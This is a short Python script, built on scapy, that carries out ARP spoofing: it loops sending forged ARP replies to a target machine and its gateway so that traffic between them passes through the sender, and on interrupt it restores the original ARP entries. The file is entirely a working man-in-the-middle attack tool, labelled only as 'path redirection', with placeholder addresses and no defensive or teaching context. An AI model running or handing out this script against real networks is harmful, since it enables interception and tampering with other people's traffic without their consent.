import sys
import time
from scapy.all import ARP, Ether, sendp

def spoof(target_ip, target_mac, spoof_ip):
    ether_layer = Ether(dst=target_mac)
    arp_layer = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    packet = ether_layer / arp_layer
    sendp(packet, verbose=False)

def restore(destination_ip, destination_mac, source_ip, source_mac):
    ether_layer = Ether(dst=destination_mac)
    arp_layer = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    packet = ether_layer / arp_layer
    sendp(packet, count=4, verbose=False)

def main():
    target_ip = "192.168.1.X"      
    target_mac = "00:11:22:33:44:55" 
    
    gateway_ip = "192.168.1.1"     
    gateway_mac = "AA:BB:CC:DD:EE:FF" 

    print("[*] Starting path redirection loop. Press Ctrl+C to stop.")
    
    try:
        while True:
            spoof(target_ip, target_mac, gateway_ip)
            spoof(gateway_ip, gateway_mac, target_ip)
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[*] Interruption detected! Restoring network tables...")
        restore(target_ip, target_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, target_ip, target_mac)
        print("[+] Network successfully restored. Exiting cleanly.")
        sys.exit(0)

if __name__ == "__main__":
    main()
